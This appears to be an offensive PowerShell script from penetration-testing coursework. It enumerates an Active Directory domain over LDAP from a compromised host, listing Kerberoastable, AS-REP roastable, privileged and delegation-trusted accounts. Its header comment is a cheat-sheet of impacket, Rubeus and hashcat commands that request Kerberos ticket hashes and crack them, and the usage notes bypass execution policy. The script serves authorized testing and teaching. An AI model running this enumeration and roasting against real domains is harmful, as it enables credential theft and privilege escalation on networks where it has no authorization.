<#
    adenum.ps1  -  Menu-driven AD enumeration (no dependencies, no PowerView)
    Usage on target:
        Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
        . .\adenum.ps1            # dot-source (note the leading dot + space)
        Invoke-ADMenu
    Prereq: run as a domain user on a domain-joined host (foothold + creds).
    Domain / DC / DN are auto-discovered - nothing is hardcoded.
    Evidence: every action tees its output to  .\adenum_<domain>_<timestamp>\

    =====================================================================
    ROASTING CHEAT-SHEET  (this script FINDS targets; these GET the hash)
    =====================================================================
    # Menu #4 lists Kerberoastable users (SPN set). Then, from KALI:
      impacket-GetUserSPNs -request -dc-ip <DC_IP> <DOMAIN>/<user>:'<pass>' -outputfile kerb.hash
      hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt --force
    # ...or ON TARGET with Rubeus (no creds needed, uses current context):
      .\Rubeus.exe kerberoast /nowrap /outfile:kerb.hash

    # Menu #5 lists AS-REP roastable users (no preauth). Then, from KALI:
      # known user:
      impacket-GetNPUsers <DOMAIN>/<user> -no-pass -dc-ip <DC_IP>
      # spray a list (use users.txt this script saved):
      impacket-GetNPUsers -dc-ip <DC_IP> -request -outputfile asrep.hash <DOMAIN>/ -usersfile users.txt
      hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt --force
    # ...or ON TARGET with Rubeus:
      .\Rubeus.exe asreproast /nowrap /outfile:asrep.hash

    # hashcat mode reminder:  13100 = Kerberoast (TGS) | 18200 = AS-REP
    =====================================================================
#>

function LDAPSearch {
    param (
        [string]$LDAPQuery
    )
    # Be forgiving: a bare/AND/OR filter without outer parens is auto-wrapped.
    $LDAPQuery = $LDAPQuery.Trim()
    if ($LDAPQuery -and -not $LDAPQuery.StartsWith('(')) { $LDAPQuery = "($LDAPQuery)" }
    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName
    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")
    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
    return $DirectorySearcher.FindAll()
}

function Save-Evidence {
    # Append a timestamped block to a file in the evidence dir (if one is set).
    param([string]$Name, [string]$Content)
    if (-not $script:OutDir) { return }
    $path  = Join-Path $script:OutDir $Name
    $stamp = "===== $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')  |  $Name ====="
    Add-Content -Path $path -Value $stamp
    Add-Content -Path $path -Value $Content
    Write-Host "[>] saved -> $path" -ForegroundColor DarkGray
}

function Show-Results {
    # Pretty-print selected properties as a table; tee to $OutFile if given.
    param($Results, [string[]]$Props = @('samaccountname','description'), [string]$OutFile)
    if (-not $Results -or $Results.Count -eq 0) { Write-Host "[!] No results." -ForegroundColor Yellow; return }
    Write-Host "[+] $($Results.Count) result(s)" -ForegroundColor Green
    $table = $Results | ForEach-Object {
        $o = [ordered]@{}
        foreach ($p in $Props) { $o[$p] = ($_.properties[$p.ToLower()] -join ', ') }
        [pscustomobject]$o
    } | Format-Table -AutoSize -Wrap | Out-String
    Write-Host $table
    if ($OutFile) { Save-Evidence $OutFile $table }
}

function Show-Members {
    # Resolve the 'member' attribute of one group (prompted); tee to $OutFile.
    param([string]$GroupName, [string]$OutFile)
    $g = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=$GroupName))"
    if (-not $g -or $g.Count -eq 0) { Write-Host "[!] Group not found: $GroupName" -ForegroundColor Yellow; return }
    Write-Host "[+] Members of '$GroupName':" -ForegroundColor Green
    $out = $g.properties.member | Out-String
    Write-Host $out
    if ($OutFile) { Save-Evidence $OutFile $out }
}

function Show-AllGroupMembers {
    # Every group + its members in one shot (emulates the course foreach loop).
    param([string]$OutFile)
    $groups = LDAPSearch "(objectCategory=group)"
    if (-not $groups -or $groups.Count -eq 0) { Write-Host "[!] No groups." -ForegroundColor Yellow; return }
    Write-Host "[+] $($groups.Count) group(s)" -ForegroundColor Green
    $out = $groups | ForEach-Object {
        [pscustomobject]@{
            cn     = ($_.properties['cn'] -join ', ')
            member = ($_.properties['member'] -join "; ")
        }
    } | Format-Table -AutoSize -Wrap | Out-String
    Write-Host $out
    if ($OutFile) { Save-Evidence $OutFile $out }
}

function Get-SafeName {
    # Turn a prompted name into a filename-safe token.
    param([string]$s)
    return (($s -replace '[^\w.-]', '_'))
}

function Invoke-ADMenu {
    # Create a per-run evidence directory in the current working dir.
    $domain = try { [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name } catch { 'domain' }
    $script:OutDir = Join-Path (Get-Location) ("adenum_{0}_{1}" -f $domain, (Get-Date -Format 'yyyyMMdd_HHmmss'))
    New-Item -ItemType Directory -Path $script:OutDir -Force | Out-Null
    Write-Host "[*] Evidence dir: $script:OutDir" -ForegroundColor Green

    while ($true) {
        Write-Host ""
        Write-Host "==================== AD ENUM ====================" -ForegroundColor Cyan
        try {
            $d = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            Write-Host (" Domain : {0}" -f $d.Name)
            Write-Host (" PDC    : {0}" -f $d.PdcRoleOwner.Name)
            Write-Host " DN     : $(([adsi]'').distinguishedName)"
        } catch {
            Write-Host " [!] Not domain-joined / can't reach domain: $($_.Exception.Message)" -ForegroundColor Red
        }
        Write-Host "-------------------------------------------------"
        Write-Host "  1) All users"
        Write-Host "  2) All groups"
        Write-Host "  3) All computers"
        Write-Host "  4) Kerberoastable users (SPN set)   <-- get creds"
        Write-Host "  5) AS-REP roastable users (no preauth)"
        Write-Host "  6) Privileged users (adminCount=1)"
        Write-Host "  7) Members of a group          (prompts)"
        Write-Host "  8) Look up one user            (prompts)"
        Write-Host "  9) Trusted for delegation"
        Write-Host " 10) Custom raw LDAP filter     (prompts)"
        Write-Host " 11) All groups + members"
        Write-Host "  0) Exit"
        Write-Host "================================================="
        $c = Read-Host "Choice"

        switch ($c) {
            '1' { Show-Results (LDAPSearch "(samAccountType=805306368)") @('samaccountname','description','memberof') 'users.txt' }
            '2' { Show-Results (LDAPSearch "(objectCategory=group)") @('cn','description') 'groups.txt' }
            '3' { Show-Results (LDAPSearch "(objectCategory=computer)") @('cn','dnshostname','operatingsystem') 'computers.txt' }
            '4' { Show-Results (LDAPSearch "(&(samAccountType=805306368)(servicePrincipalName=*))") @('samaccountname','serviceprincipalname') 'kerberoastable.txt' }
            '5' { Show-Results (LDAPSearch "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))") @('samaccountname','description') 'asrep_roastable.txt' }
            '6' { Show-Results (LDAPSearch "(&(objectCategory=user)(admincount=1))") @('samaccountname','memberof') 'privileged_admincount.txt' }
            '7' {
                    $n = Read-Host "Group cn (e.g. Domain Admins)"
                    Show-Members $n ("group_members_{0}.txt" -f (Get-SafeName $n))
                 }
            '8' {
                    $n = Read-Host "User cn or samaccountname"
                    Show-Results (LDAPSearch "(&(objectCategory=user)(|(cn=$n)(samaccountname=$n)))") `
                        @('samaccountname','description','memberof','pwdlastset','lastlogon','serviceprincipalname') `
                        ("user_{0}.txt" -f (Get-SafeName $n))
                 }
            '9' { Show-Results (LDAPSearch "(userAccountControl:1.2.840.113556.1.4.803:=524288)") @('samaccountname','cn') 'trusted_for_delegation.txt' }
            '10' {
                    $q = Read-Host "Raw LDAP filter, e.g. (&(objectCategory=group)(cn=Sales*))"
                    $p = Read-Host "Props to show (comma-sep, blank=samaccountname,cn,description)"
                    if ([string]::IsNullOrWhiteSpace($p)) { $props = @('samaccountname','cn','description') }
                    else { $props = $p.Split(',') | ForEach-Object { $_.Trim() } }
                    Show-Results (LDAPSearch $q) $props 'custom.txt'
                 }
            '11' { Show-AllGroupMembers 'groups_members.txt' }
            '0' { Write-Host "[*] Evidence saved in: $script:OutDir" -ForegroundColor Green; break }
            default { Write-Host "[!] Pick a number from the menu." -ForegroundColor Yellow }
        }
    }
}

Write-Host "[*] Loaded. Run:  Invoke-ADMenu   (or call LDAPSearch directly)" -ForegroundColor Green
Write-Host "[*] Roasting commands are in the header comment (open the script to copy)." -ForegroundColor DarkGray
